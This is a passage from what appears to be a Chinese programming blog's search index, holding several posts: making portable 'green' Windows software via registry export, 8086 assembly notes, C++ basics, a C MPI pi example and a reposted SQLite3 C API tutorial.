2000的一样，仅仅是程序的版本不同。 把制作好的绿色的emeditor拷贝到U盘上，需要用的时候，直接执行里面的install.bat文件就可以了（注意，要在Emeditor的目录运行批处理文件），不需要任何文件拷贝。这个例子演示如何自动绿色安装，如何解决路径问题，如果你用几十个类似的绿色软件，但是需要手工修改路径的话，是很难记住那些路径需要修改的，当然你如果可以写出自动替换路径的脚本也是可以的。我说u盘就是为了强调 路径可以变化，如果大家所使用的机器的所有分区排列都是一样的话，都是把软件存储到c：的话，是可以直接备份注册表的，否则需要手工修改路径，修改一个容易，多了就麻烦了。 从以上的事例中，可以看出，方法2和方法1基本一样，只不过方法1我们使用WinRar解压缩，而方法2我们使用安装程序解压缩。方法6可以说是方法5的简化版本，方法3和方法4也可以辅助方法5，也有一些需要联合应用这些方法，有时候难以判断到底使用了那个方法，方法是死的，需要灵活运用，有些时候需要不断试验。 我简单说几个软件”绿化”时候使用的方法，某些软件可能有多种”绿化”方法，然而最后的结果基本一样： 使用方法1就不提了，只要没有专门的安装程序，直接以zip形式发布的，都使用方法1。CuteFTP,Flashfxp,qq，foobar ，winamp2.8,acrobat，FinalData ，金山词霸 ，ZoomPlayer，WinISO ，IsoBuster，WinISO ，MIRC，WinCVS,Photoshop6 ，EASYRECOVERY 6.03，网易泡泡使用方法2。 VisualC++ 6， real player，realmedia的解码器包，大部分解码器如vp6，mpeg2，ac3 ，ogg ，divx ，xvid 使用方法5。 Netants ，flashget，OfflineExplorer acdsee，ultraedit ,IBM词典，theBat，网文快捕，和现在的CyberArticle，PartitionMagic7 使用方法6。 不适合”绿化”的有Directx9，Mediaplayer9，IE6，微软的补丁程序，Office2003，反病毒工具NAV，Java虚拟机，虚拟机VMware等等，其中有些是不知道如何”绿化”或者说比较困难，如Office 2003，我认为那种把Office安装到硬盘上，然后抽去注册表的变化的方法部叫做”绿化”，因为注册表文件中有大量的绝对路径存在，而且Offcie的组件之间有比较复杂的联系，所以难以”绿化”。有些是”绿化”没有意义，如IE6，微软的补丁程序，Directx9等等。 目前我使用的软件，绝大部分都”绿化”了，只有少数几个必须安装了，如MS Office，Visual Studio.net 2003等等。感觉非常方便，尤其是改变盘符的时候，非常简单，可以做到便携化。 绿色软件自己做！ 绿色软件以其小巧实用、无需安装、不给系统增加垃圾文件而受到广大用户的青睐。可惜目前网络上提供的绿色软件较少，在功能应用上也比较单一。如果我们常用的，如文字图像处理、杀毒、多媒体等类型软件都是绿色的，那该多好啊！利用Windows优化大师，就能实现这一梦想。 下载安装完成后，运行优化大师，在左方的功能列表中点击进入”系统清理维护”类别中的”软件智能卸载”，页面上方的程序列表中提供了当前电脑中已经安装的全部应用程序名单，先在该名单中选择一个要制作成绿色软件的目标软件，然后点击右边的”分析”按钮，优化大师即开始智能分析与该应用程序相关的信息（如果要分析的软件没有出现在列表中，请点击”其他”按钮，手动选择要分析的软件）。 这里笔者以选择FlashGet（网际快车）为例，详细讲述优化大师如何制作软件的绿色运行版。 根据所分析软件的大小以及复杂程度，智能分析大概需要几十秒到数分钟不等的时间，待分析完成后，即可在下方的关联文件框中看到该软件正常运行时所需要的所有文件，注册表键值信息也在其中，如图1所示。请将这些注册表键值先行记下，单击”卸载”按钮，优化大师开始备份相关的注册表信息和文件信息，接着进行卸载操作。卸载完毕后，刚才所有被智能分析的文件，都被保存到了Windows优化大师安装目录下的BackupUninstallFiles文件夹中，将这里的文件全部复制提取出来，放在一个新文件夹中，例如笔者为该文件夹起名为”FlashGet绿色安装包”。 在”开始→运行”中输入regedit命令，打开注册表编辑器，依次选择”编辑→查找”，在”查找目标”中输入刚才记下的注册表键值名称和相应键值（如图2所示）。找到后，在该键值上单击右键，选择”导出”命令，将软件的注册表文件全部导出到之前的”FlashGet绿色安装包”文件夹中。这样FlashGet的绿色软件安装包就做好了。 将该安装包拷贝到未安装FlashGet的电脑上，双击安装包中的”.reg”文件，导入注册表信息，最后执行软件主程序，FlashGet就能够在这台电脑上运行了。小提示：在理论上，以此种方法可以将所有软件全部制作成绿色运行版，但由于大型软件的注册表键值和关联文件为数众多，在查找时需要耗费大量的时间，这就违背了绿色软件”精简易用”的宗旨，因此建议大家以此法制作大小在50M以下的中小软件为佳。","link":"/2021/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/%E7%BB%BF%E8%89%B2%E8%BD%AF%E4%BB%B6%E5%88%B6%E4%BD%9C%E6%96%B9%E6%B3%95/"},{"title":"汇编学习笔记：标志寄存器（flag）","text":"[[Assembly|汇编笔记系列]] flag寄存器的每一位都表示单独的含义，记录特定的信息。这种信息通常称作程序状态字（PSW）。 该寄存器长2字节，结构如下所示。 1215 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0 OF DF IF TF SF ZF AF PF CF 下面逐个解释。 ZF标志第6位，零位标志。它记录相关指令执行后，结果是否为零。为零则zf=1，否则zf=0。 这里的相关指令包含add,sub,mul,div,inc,or,and等，它们大多都是运算指令。因此，使用指令时，要注意它的全部功能，包括执行结果对标志寄存器的影响。 PF标志第2位，奇偶标志位。它记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数。若是则是1，否则为0。 SF标志第7位，符号标志位。它记录相关指令执行后，其结果是否为负（即存储单元最高位bit是否为1）。若是则是1，否则为0。只有将数据当做有符号数来运算的时候，其值才有意义。 换句话说，算数运算必然影响SF的值，是否需要此值则看我们如何看待指令所进行的运算。 CF标志第0位，进位标志位。一般在进行无符号数运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。 OF标志","link":"/2021/09/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Assembly/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88flag%EF%BC%89/"},{"title":"汇编学习笔记：段","text":"[[Assembly|汇编笔记系列]] 直接上例程吧： 12345678910111213141516171819202122232425262728293031323334353637383940414243assume cs:code,ds:data,ss:stackdata segment dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987hdw endsstack segment dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0stack endscode segmentstart: mov ax,stack mov ss,ax mov sp,20h ;设置栈顶ss:sp指向stack:20 mov ax,data mov ds,ax mov bx,0 mov cx,8 s: push [bx] add bx,2 loop s mov bx,0 mov cx,8 s0: pop [bx] add bx,2 loop s0 mov ax,4c00h int 21hcode endsend start 简单来说，段可以把程序划分为多个部分，便于我们更清晰地组织指令，数据和栈。 一个程序可以有多个段，只需要使用不同的段名即可。那么编译器怎么知道程序从哪里开始执行呢？从start标号开始。同样，这个标号的名称也是由我们自己确定的。 每个段的地址是段名：0000H。这样的设计十分方便我们随时使用不同的段。如此组织代码，数据和栈，程序就显得十分清晰。所以，多多使用段吧。","link":"/2021/09/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Assembly/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%AE%B5/"},{"title":"汇编学习笔记：汇编基础","text":"[[Assembly|汇编笔记系列]] 先放一段源代码。 1234567891011121314151617181920212223assume cs:codecode segment mov ax, 0ffffh mov ds, ax mov bx, 0 mov dx, 0 mov cx, 12 s: mov al, [bx] mov ah, 0 add dx, ax inc bx loop s mov ax, 4c00h int 21hcode endsend 上面的程序计算ffff:0-ffff:b单元中数据的和，结果存储在dx中。 下面先说些东西再看这个程序。 存储单元存储器被划分为多个存储单元，编号从0开始。一个存储单元可存储一个Byte（B），即8bit（1bit（b）是一个二进制位）或者称作一字节。两个字节合成一个字，也就是字面意思上的字。 寄存器这里**只讨论8086CPU**。CPU主要部件是寄存器。我们通过改写寄存器中的内容来控制CPU，从而完成各种程序。8086CPU的寄存器有：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。后面单独介绍这些寄存器。 通用寄存器8086所有寄存器都是16位的，可存放两个字节（或称为一个字）。AX、BX、CX、DX这四个寄存器通常用来存放一般性的数据，所以它们又被称作通用寄存器。它由16个二进制位构成，最右边是最低位，最左边是最高位，编号从零开始，从右往左依次升高，这和数字各位的读写顺序一样。 不仅如此，这四个寄存器每个都能分成2个独立的8位寄存器来使用。AX对应AH和AL，H是high，即高八位；L是low，即低八位。另外3个寄存器同理。 字和字节在其中的存储，都是从右至左，从低八位最右侧到高八位最左侧。 内存的读写首先做一个简单的算数。8位对应256种状态，同时也对应2个16进制数。而8086的物理地址长度是20位，也就对应5位十六进制数。那么，地址应该如何存储呢？用两个寄存器。一个存放16位，另一个存放4位。前者存放的，被称为偏移地址（offset），后者存放的，被称为段地址。 当获得段地址和偏移地址后，CPU中的地址加法器会利用如下公式进行转换： 1物理地址=段地址*16+偏移地址 段寄存器8086中，段地址在段寄存器种存储。它有四个段寄存器：CS,DS,SS,ES。8086要访问内存时由这四个段寄存器提供内存单元的段地址。 [CS:IP] [jmp] Debug简介DS和[address]mov, add, sub指令CPU的栈机制[push,pop] [bx], loop段前缀","link":"/2021/09/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Assembly/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"},{"title":"汇编学习笔记：转移指令与子程序","text":"[[Assembly|汇编笔记系列]] 例程先上例程。 123456789101112131415161718192021assume cs:codedata segment db 'conversation'data endscode segment start:mov ax,data mov ds,ax mov si,0 mov cx,12 call capital mov ax,4c00h int 21hcapital:and byte ptr [si],11011111b inc si loop capital retcode endsend start 这个程序的作用，是将data段中的字符串转化为大写。转换的原理，是大小写字母的ASCLL码的二进制的某一位不同。使用and和or就可以不使用判断语句而直接转换大小写了。 简介 call：用来进行标号跳转。call [标号]会将CS:IP中的IP的地址设置为指向标号所在的位置，同时将当前的CS:IP中的IP压入栈中。相当于这样： 12push IPjmp [标号和当前行的相对距离] 是不是很像C语言的goto呢？ ret：用来返回程序之前的位置。ret就相当于pop IP。 二者组合使用，就可以实现子程序的机制。其框架如下： 123标号: 指令 ret 使用子程序的框架如下： 1234567891011121314151617181920212223assume cs:codecode segment main: : : call sub1 : : mov ax,4c00h int 21h sub1: : : call sub2 : : ret sub2: : : : retcode endsend main 参数传递有几种思路。 第一种，利用寄存器传递参数。仅适用于参数个数少的情况。 第二种，用寄存器传递参数长度，给子程序传递参数地址。 第三种，利用栈来传递参数。 寄存器冲突有可能在主程序和子程序中，都有同样的寄存器被使用（比如循环计数寄存器CX）。此时，程序就不会按照预期来运行。 我们的解决方法是，在子程序中使用寄存器时，将所有值存储到栈里，在子程序返回前再恢复。 三个子程序在实验中提到了三个子程序，分别是字符串显示，解决除法溢出，数值显示。后面我会试着自己写出来。","link":"/2021/09/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Assembly/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4%E4%B8%8E%E5%AD%90%E7%A8%8B%E5%BA%8F/"},{"title":"C++学习笔记：基础篇","text":"函数部分内联函数代码直接内嵌而无需跳转进入函数，执行速度更快，但存储空间占用更大。适用于函数体短且调用频繁的地方。 用法 在函数原型/定义前加上关键字inline即可。例如： 1inline int add(int a, int b){return a+b;} 注意：内联函数不能递归。 C语言的寄存器变量：将值存储在处理器的寄存器中，能提高运行速度。声明前加上register即可。不过一般很少用，因为现在编译器优化都很强了。 引用变量：&amp;的重载主要用于函数的参数，以此实现传址调用，和const指针比较像。不过和指针又有区别：声明时就得初始化。 用法：和指针声明很像： 123456789101112131415161718#include &lt;iostream&gt;using namespace std;void swap(int &amp;a, int &amp;b){int temp=a;a=b,b=temp;}int main(void){ int rats; int &amp;rodents = rats; int a = 5, b = 3; cout&lt;&lt;&quot;a=&quot;&lt;&lt;a&lt;&lt;&quot; b=&quot;&lt;&lt;b&lt;&lt;endl; swap(&amp;a, &amp;b); cout&lt;&lt;&quot;a=:&lt;&lt;a&lt;&lt;&quot; b=&quot;&lt;&lt;b&lt;&lt;endl; return 0; //C++可以不加} 默认参数 用法：从右往左添加： 1int chico(int n, int m, int c=0); 函数多态允许声明同名但不同参的函数。这一般用来解决对不同类型参数应用同一种操作的情况，即“泛型编程”。典型的例子如下： 123int abs(int x){return x&gt;0?x:-x;}float abs(float x){return x&gt;0?x:-x;}double abs(double x){return x&gt;0?x:-x;} 当然，也可以使用C++模板来完成。 C++泛型编程借助模板，可以实现与数据类型无关的编程。","link":"/2021/10/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%AF%87/"},{"title":"C语言MPI学习笔记","text":"简介 内容由New Bing自动生成，注意甄别 MPI是一种用于并行计算的消息传递接口，它可以让多个进程在不同的机器（节点）上协同工作，通过发送和接收数据来完成复杂的计算任务。 简单地说，这是一个位高性能并行计算提供的一个基础通信规范。依靠它，可以编写出在多个核心/CPU集群上并行运行的程序。 要使用C语言MPI，您需要安装一个MPI软件，如MPICH，OpenMPI或MVAPICH，并使用mpicc或mpic++命令来编译您的C程序。 您还需要使用一些MPI的API函数来初始化和结束MPI环境，获取进程数和进程编号（称为“rank”），以及进行数据交换。 数据交换的主要方式有两种：发送（send）和接收（recv）。发送可以分为阻塞（blocking）和非阻塞（non-blocking）两种，阻塞发送会等待数据被接收方确认，而非阻塞发送会继续执行后续的代码，但需要使用等待（wait）函数来同步数据的状态。 依靠MPI构建的数据计算程序有多种架构，MIMD和SIMD都是它支持的架构。不过一般使用后一种，也就是单程序多数据流。 对于这种架构，又有两种不同的设计模式：主从结构，以及对等结构。它们适用于大多数情况。 实例下面是一个简单的C语言MPI程序的示例，它可以计算圆周率的近似值： 作者：xiongw21@mails.tsinghua.edu.cn 123456789101112131415161718192021222324252627282930313233#include &quot;mpi.h&quot;#include &lt;stdio.h&gt;double f(double);double f(double x){ return (4.0/(1.0+x*x));}int main(int argc,char *argv[]){ int myid, numprocs; int n, i; double mypi, pi; double h, sum, x; MPI_Init(&amp;argc,&amp;argv); MPI_Comm_size(MPI_COMM_WORLD,&amp;numprocs); MPI_Comm_rank(MPI_COMM_WORLD,&amp;myid); printf(&quot;Process %d of %d.\\n&quot;, myid, numprocs); n = 100; h = 1.0 / (double) n; sum = 0.0; for (i = myid + 1; i &lt;= n; i += numprocs) { x = h * ((double)i - 0.5); sum +=f(x); } mypi = h * sum; MPI_Reduce(&amp;mypi, &amp;pi, 1, MPI_DOUBLE, MPI_SUM, 0, MPI_COMM_WORLD); if (myid == 0) { printf(&quot;The result is %.10f.\\n&quot;,pi); } MPI_Finalize();}","link":"/2023/04/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/C%E8%AF%AD%E8%A8%80MPI%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"C语言SQLite3使用总结","text":"转载网址：查看 前序： Sqlite3 的确很好用。小巧、速度快。但是因为非微软的产品，帮助文档总觉得不够。这些天再次研究它，又有一些收获，这里把我对 sqlite3 的研究列出来，以备忘记。 这里要注明，我是一个跨平台专注者，并不喜欢只用 windows 平台。我以前的工作就是为 unix 平台写代码。下面我所写的东西，虽然没有验证，但是我已尽量不使用任何 windows 的东西，只使用标准 C 或标准C++。但是，我没有尝试过在别的系统、别的编译器下编译，因此下面的叙述如果不正确，则留待以后修改。 下面我的代码仍然用 VC 编写，因为我觉得VC是一个很不错的IDE，可以加快代码编写速度（例如配合 Vassist ）。下面我所说的编译环境，是VC2003。如果读者觉得自己习惯于 unix 下用 vi 编写代码速度较快，可以不用管我的说明，只需要符合自己习惯即可，因为我用的是标准 C 或 C++ 。不会给任何人带来不便。 一、版本从 www.sqlite.org 网站可下载到最新的 sqlite 代码和编译版本。我写此文章时，最新代码是 3.3.17 版本。 很久没有去下载 sqlite 新代码，因此也不知道 sqlite 变化这么大。以前很多文件，现在全部合并成一个 sqlite3.c 文件。如果单独用此文件，是挺好的，省去拷贝一堆文件还担心有没有遗漏。但是也带来一个问题：此文件太大，快接近7万行代码，VC开它整个机器都慢下来了。如果不需要改它代码，也就不需要打开 sqlite3.c 文件，机器不会慢。但是，下面我要写通过修改 sqlite 代码完成加密功能，那时候就比较痛苦了。如果个人水平较高，建议用些简单的编辑器来编辑，例如UltraEdit 或 Notepad 。速度会快很多。 二、基本编译这个不想多说了，在 VC 里新建 dos 控制台空白工程，把 sqlite3.c 和 sqlite3.h 添加到工程，再新建一个 main.cpp文件。在里面写: 123456789101112131415extern &quot;C&quot;{#include &quot;./sqlite3.h&quot;};int main( int , char** ){return 0;} 为什么要 extern “C” ？如果问这个问题，我不想说太多，这是C++的基础。要在 C++ 里使用一段 C 的代码，必须要用 extern “C” 括起来。C++跟 C虽然语法上有重叠，但是它们是两个不同的东西，内存里的布局是完全不同的，在C++编译器里不用extern “C”括起C代码，会导致编译器不知道该如何为 C 代码描述内存布局。 可能在 sqlite3.c 里人家已经把整段代码都 extern “C” 括起来了，但是你遇到一个 .c 文件就自觉的再括一次，也没什么不好。 基本工程就这样建立起来了。编译，可以通过。但是有一堆的 warning。可以不管它。 三、SQLITE操作入门sqlite提供的是一些C函数接口，你可以用这些函数操作数据库。通过使用这些接口，传递一些标准 sql 语句（以 char * 类型）给 sqlite 函数，sqlite 就会为你操作数据库。 sqlite 跟MS的access一样是文件型数据库，就是说，一个数据库就是一个文件，此数据库里可以建立很多的表，可以建立索引、触发器等等，但是，它实际上得到的就是一个文件。备份这个文件就备份了整个数据库。 sqlite 不需要任何数据库引擎，这意味着如果你需要 sqlite 来保存一些用户数据，甚至都不需要安装数据库(如果你做个小软件还要求人家必须装了sqlserver 才能运行，那也太黑心了)。 下面开始介绍数据库基本操作。 1 基本流程（1）关键数据结构 sqlite 里最常用到的是 sqlite3 * 类型。从数据库打开开始，sqlite就要为这个类型准备好内存，直到数据库关闭，整个过程都需要用到这个类型。当数据库打开时开始，这个类型的变量就代表了你要操作的数据库。下面再详细介绍。 （2）打开数据库 int sqlite3_open( 文件名, sqlite3 ** ); 用这个函数开始数据库操作。 需要传入两个参数，一是数据库文件名，比如：c://DongChunGuang_Database.db。 文件名不需要一定存在，如果此文件不存在，sqlite 会自动建立它。如果它存在，就尝试把它当数据库文件来打开。 sqlite3 ** 参数即前面提到的关键数据结构。这个结构底层细节如何，你不要关它。 函数返回值表示操作是否正确，如果是 SQLITE_OK 则表示操作正常。相关的返回值sqlite定义了一些宏。具体这些宏的含义可以参考 sqlite3.h 文件。里面有详细定义（顺便说一下，sqlite3 的代码注释率自称是非常高的，实际上也的确很高。只要你会看英文，sqlite 可以让你学到不少东西）。 下面介绍关闭数据库后，再给一段参考代码。 （3）关闭数据库 1int sqlite3_close(sqlite3 *); 前面如果用 sqlite3_open 开启了一个数据库，结尾时不要忘了用这个函数关闭数据库。 下面给段简单的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445extern &quot;C&quot;{#include &quot;./sqlite3.h&quot;};int main( int , char** ){ sqlite3 * db = NULL; //声明sqlite关键结构指针 int result;//打开数据库//需要传入 db 这个指针的指针，因为 sqlite3_open 函数要为这个指针分配内存，还要让db指针指向这个内存区 result = sqlite3_open( “c://Dcg_database.db”, &amp;db ); if( result != SQLITE_OK ) { //数据库打开失败return -1;}//数据库操作代码//…//数据库打开成功//关闭数据库sqlite3_close( db );return 0;} 这就是一次数据库操作过程。 2 SQL语句操作 本节介绍如何用sqlite 执行标准 sql 语法。 （1）执行sql语句 1int sqlite3_exec(sqlite3*, const char *sql, sqlite3_callback, void *, char **errmsg ); 这就是执行一条 sql 语句的函数。 第1个参数不再说了，是前面open函数得到的指针。说了是关键数据结构。 第2个参数const char *sql 是一条 sql 语句，以/0结尾。 第3个参数sqlite3_callback 是回调，当这条语句执行之后，sqlite3会去调用你提供的这个函数。（什么是回调函数，自己找别的资料学习） 第4个参数void * 是你所提供的指针，你可以传递任何一个指针参数到这里，这个参数最终会传到回调函数里面，如果不需要传递指针给回调函数，可以填NULL。等下我们再看回调函数的写法，以及这个参数的使用。 第5个参数char ** errmsg 是错误信息。注意是指针的指针。sqlite3里面有很多固定的错误信息。执行 sqlite3_exec 之后，执行失败时可以查阅这个指针（直接 printf(“%s/n”,errmsg)）得到一串字符串信息，这串信息告诉你错在什么地方。sqlite3_exec函数通过修改你传入的指针的指针，把你提供的指针指向错误提示信息，这样sqlite3_exec函数外面就可以通过这个 char*得到具体错误提示。 说明：通常，sqlite3_callback 和它后面的 void * 这两个位置都可以填 NULL。填NULL表示你不需要回调。比如你做insert 操作，做 delete 操作，就没有必要使用回调。而当你做 select 时，就要使用回调，因为 sqlite3 把数据查出来，得通过回调告诉你查出了什么数据。 （2）exec 的回调 1typedef int (*sqlite3_callback)(void*,int,char**, char**); 你的回调函数必须定义成上面这个函数的类型。下面给个简单的例子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117//sqlite3的回调函数 // sqlite 每查到一条记录，就调用一次这个回调int LoadMyInfo( void * para, int n_column, char ** column_value, char ** column_name ){ //para是你在 sqlite3_exec 里传入的 void * 参数 //通过para参数，你可以传入一些特殊的指针（比如类指针、结构指针），然后在这里面强制转换成对应的类型（这里面是void*类型，必须强制转换成你的类型才可用）。然后操作这些数据 //n_column是这一条记录有多少个字段 (即这条记录有多少列) // char ** column_value 是个关键值，查出来的数据都保存在这里，它实际上是个1维数组（不要以为是2维数组），每一个元素都是一个 char * 值，是一个字段内容（用字符串来表示，以/0结尾） //char ** column_name 跟 column_value是对应的，表示这个字段的字段名称 //这里，我不使用 para 参数。忽略它的存在. int i;printf( “记录包含 %d 个字段/n”, n_column );for( i = 0 ; i &lt; n_column; i ++ ){ printf( “字段名:%s ß&gt; 字段值:%s/n”, column_name[i], column_value[i] );}printf( “------------------/n“ ); return 0;}int main( int , char ** ){ sqlite3 * db; int result; char * errmsg = NULL; result = sqlite3_open( “c://Dcg_database.db”, &amp;db ); if( result != SQLITE_OK ) { //数据库打开失败return -1;}//数据库操作代码//创建一个测试表，表名叫 MyTable_1，有2个字段： ID 和 name。其中ID是一个自动增加的类型，以后insert时可以不去指定这个字段，它会自己从0开始增加result = sqlite3_exec( db, “create table MyTable_1( ID integer primary key autoincrement, name nvarchar(32) )”, NULL, NULL, errmsg );if(result != SQLITE_OK ){ printf( “创建表失败，错误码:%d，错误原因:%s/n”, result, errmsg );}//插入一些记录result = sqlite3_exec( db, “insert into MyTable_1( name ) values ( ‘走路’ )”, 0, 0, errmsg );if(result != SQLITE_OK ){ printf( “插入记录失败，错误码:%d，错误原因:%s/n”, result, errmsg );}result = sqlite3_exec( db, “insert into MyTable_1( name ) values ( ‘骑单车’ )”, 0, 0, errmsg );if(result != SQLITE_OK ){ printf( “插入记录失败，错误码:%d，错误原因:%s/n”, result, errmsg );}result = sqlite3_exec( db, “insert into MyTable_1( name ) values ( ‘坐汽车’ )”, 0, 0, errmsg );if(result != SQLITE_OK ){ printf( “插入记录失败，错误码:%d，错误原因:%s/n”, result, errmsg );}//开始查询数据库result = sqlite3_exec( db, “select * from MyTable_1”, LoadMyInfo, NULL, errmsg );//关闭数据库sqlite3_close( db );return 0;} 通过上面的例子，应该可以知道如何打开一个数据库，如何做数据库基本操作。 有这些知识，基本上可以应付很多数据库操作了。 （3）不使用回调查询数据库 上面介绍的 sqlite3_exec 是使用回调来执行 select 操作。还有一个方法可以直接查询而不需要回调。但是，我个人感觉还是回调好，因为代码可以更加整齐，只不过用回调很麻烦，你得声明一个函数，如果这个函数是类成员函数，你还不得不把它声明成 static 的（要问为什么？这又是C++基础了。C++成员函数实际上隐藏了一个参数：this，C++调用类的成员函数的时候，隐含把类指针当成函数的第一个参数传递进去。结果，这造成跟前面说的 sqlite 回调函数的参数不相符。只有当把成员函数声明成 static 时，它才没有多余的隐含的this参数）。 虽然回调显得代码整齐，但有时候你还是想要非回调的 select 查询。这可以通过 sqlite3_get_table 函数做到。 1int sqlite3_get_table(sqlite3*, const char *sql, char ***resultp, int *nrow, int *ncolumn, char **errmsg ); 第1个参数不再多说，看前面的例子。 第2个参数是 sql 语句，跟 sqlite3_exec 里的 sql 是一样的。是一个很普通的以/0结尾的char *字符串。 第3个参数是查询结果，它依然一维数组（不要以为是二维数组，更不要以为是三维数组）。它内存布局是：第一行是字段名称，后面是紧接着是每个字段的值。下面用例子来说事。 第4个参数是查询出多少条记录（即查出多少行）。 第5个参数是多少个字段（多少列）。 第6个参数是错误信息，跟前面一样，这里不多说了。 下面给个简单例子: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081int main( int , char ** ){ sqlite3 * db; int result; char * errmsg = NULL; char **dbResult; //是 char ** 类型，两个*号 int nRow, nColumn; int i , j; int index; result = sqlite3_open( “c://Dcg_database.db”, &amp;db ); if( result != SQLITE_OK ) { //数据库打开失败 return -1; } //数据库操作代码 //假设前面已经创建了 MyTable_1 表 //开始查询，传入的 dbResult 已经是 char **，这里又加了一个 &amp; 取地址符，传递进去的就成了 char *** result = sqlite3_get_table( db, “select * from MyTable_1”, &amp;dbResult, &amp;nRow, &amp;nColumn, &amp;errmsg ); if( SQLITE_OK == result ) { //查询成功 index = nColumn; //前面说过 dbResult 前面第一行数据是字段名称，从 nColumn 索引开始才是真正的数据 printf( “查到%d条记录/n”, nRow ); for( i = 0; i &lt; nRow ; i++ ) { printf( “第 %d 条记录/n”, i+1 ); for( j = 0 ; j &lt; nColumn; j++ ) { printf( “字段名:%s ß&gt; 字段值:%s/n”, dbResult[j], dbResult [index] ); ++index; // dbResult 的字段值是连续的，从第0索引到第 nColumn - 1索引都是字段名称，从第 nColumn 索引开始，后面都是字段值，它把一个二维的表（传统的行列表示法）用一个扁平的形式来表示 } printf( “-------/n” ); } } //到这里，不论数据库查询是否成功，都释放 char** 查询结果，使用 sqlite 提供的功能来释放 sqlite3_free_table( dbResult ); //关闭数据库 sqlite3_close( db ); return 0;} 到这个例子为止，sqlite3 的常用用法都介绍完了。 用以上的方法，再配上 sql 语句，完全可以应付绝大多数数据库需求。 但有一种情况，用上面方法是无法实现的：需要insert、select 二进制。当需要处理二进制数据时，上面的方法就没办法做到。下面这一节说明如何插入二进制数据 3 操作二进制 sqlite 操作二进制数据需要用一个辅助的数据类型：sqlite3_stmt * 。 这个数据类型记录了一个“sql语句”。为什么我把 “sql语句” 用双引号引起来？因为你可以把 sqlite3_stmt * 所表示的内容看成是 sql语句，但是实际上它不是我们所熟知的sql语句。它是一个已经把sql语句解析了的、用sqlite自己标记记录的内部数据结构。 正因为这个结构已经被解析了，所以你可以往这个语句里插入二进制数据。当然，把二进制数据插到 sqlite3_stmt 结构里可不能直接 memcpy ，也不能像 std::string 那样用 + 号。必须用 sqlite 提供的函数来插入。 （1）写入二进制 下面说写二进制的步骤。 要插入二进制，前提是这个表的字段的类型是 blob 类型。我假设有这么一张表： 1create table Tbl_2( ID integer, file_content blob ) 首先声明 1sqlite3_stmt * stat; 然后，把一个 sql 语句解析到 stat 结构里去： 1sqlite3_prepare( db, “insert into Tbl_2( ID, file_content) values( 10, ? )”, -1, &amp;stat, 0 ); 上面的函数完成 sql 语句的解析。第一个参数跟前面一样，是个 sqlite3 * 类型变量，第二个参数是一个 sql 语句。 这个 sql 语句特别之处在于 values 里面有个 ? 号。在sqlite3_prepare函数里，?号表示一个未定的值，它的值等下才插入。 第三个参数我写的是-1，这个参数含义是前面 sql 语句的长度。如果小于0，sqlite会自动计算它的长度（把sql语句当成以/0结尾的字符串）。 第四个参数是 sqlite3_stmt 的指针的指针。解析以后的sql语句就放在这个结构里。 第五个参数我也不知道是干什么的。为0就可以了。 如果这个函数执行成功（返回值是 SQLITE_OK 且 stat 不为NULL ），那么下面就可以开始插入二进制数据。 1sqlite3_bind_blob( stat, 1, pdata, (int)(length_of_data_in_bytes), NULL ); // pdata为数据缓冲区，length_of_data_in_bytes为数据大小，以字节为单位 这个函数一共有5个参数。 第1个参数：是前面prepare得到的 sqlite3_stmt * 类型变量。 第2个参数：?号的索引。前面prepare的sql语句里有一个?号，假如有多个?号怎么插入？方法就是改变 bind_blob 函数第2个参数。这个参数我写1，表示这里插入的值要替换 stat 的第一个?号（这里的索引从1开始计数，而非从0开始）。如果你有多个?号，就写多个 bind_blob 语句，并改变它们的第2个参数就替换到不同的?号。如果有?号没有替换，sqlite为它取值null。 第3个参数：二进制数据起始指针。 第4个参数：二进制数据的长度，以字节为单位。 第5个参数：是个析够回调函数，告诉sqlite当把数据处理完后调用此函数来析够你的数据。这个参数我还没有使用过，因此理解也不深刻。但是一般都填NULL，需要释放的内存自己用代码来释放。 